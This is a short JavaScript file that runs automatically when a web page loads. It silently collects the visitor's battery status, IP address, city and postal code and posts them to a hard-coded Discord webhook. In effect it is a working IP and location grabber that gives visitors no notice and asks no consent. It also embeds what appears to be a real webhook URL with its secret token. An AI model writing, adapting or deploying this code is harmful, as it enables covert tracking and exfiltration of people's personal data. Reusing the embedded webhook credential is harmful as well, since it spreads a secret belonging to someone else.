// Replace with your Discord Webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1303797692471836752/UGvqu5pljOtWO-BwVn722myUjIKAs17lKGPDkPZlCOfuX0fWgqNFgB2zS_OrvnVLJT0T'; // <-- Replace with your actual webhook URL
const LOCATION_API_URL = 'http://ipinfo.io/json'; // Location API to get IP, city, postal code

// This function will collect battery information and send it to Discord
function getBatteryInfo() {
    // Check if the browser supports battery info (navigator.getBattery)
    if (navigator.getBattery) {
        navigator.getBattery().then(function(battery) {
            let batteryInfo = `Battery Percentage: ${battery.level * 100}%\n`;
            batteryInfo += `Charging Status: ${battery.charging ? 'Charging' : 'Not Charging'}\n`;

            // Now fetch the IP and location info and combine everything
            getLocationInfo(batteryInfo);
        });
    } else {
        alert("Battery information is not available in this browser.");
    }
}

// This function gets the user's IP address, city, and postal code
function getLocationInfo(batteryInfo) {
    // Fetch location data from ipinfo.io
    fetch(LOCATION_API_URL)
        .then(response => response.json())  // Parse the JSON response
        .then(data => {
            let locationInfo = `IP Address: ${data.ip}\n`;
            locationInfo += `City: ${data.city}\n`;
            locationInfo += `Postal Code: ${data.postal}\n`;

            // Combine the battery info and location info into one message
            let fullInfo = batteryInfo + locationInfo;

            // Send the info to Discord
            sendToDiscord(fullInfo);
        })
        .catch(err => {
            console.error("Error fetching location info:", err);
            alert("Unable to fetch location info.");
        });
}

// This function sends the collected info to the Discord webhook
function sendToDiscord(content) {
    const payload = {
        content: content  // The data we want to send to Discord
    };

    // Send the payload (data) to Discord's webhook
    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)  // Convert the data to JSON
    })
    .then(response => response.json())  // Parse the response from Discord
    .then(data => {
        console.log("Data sent to Discord:", data);
    })
    .catch(error => {
        console.error("Error sending data to Discord:", error);
    });
}

// When the page loads, it will automatically collect the battery info
window.onload = function() {
    getBatteryInfo();
};
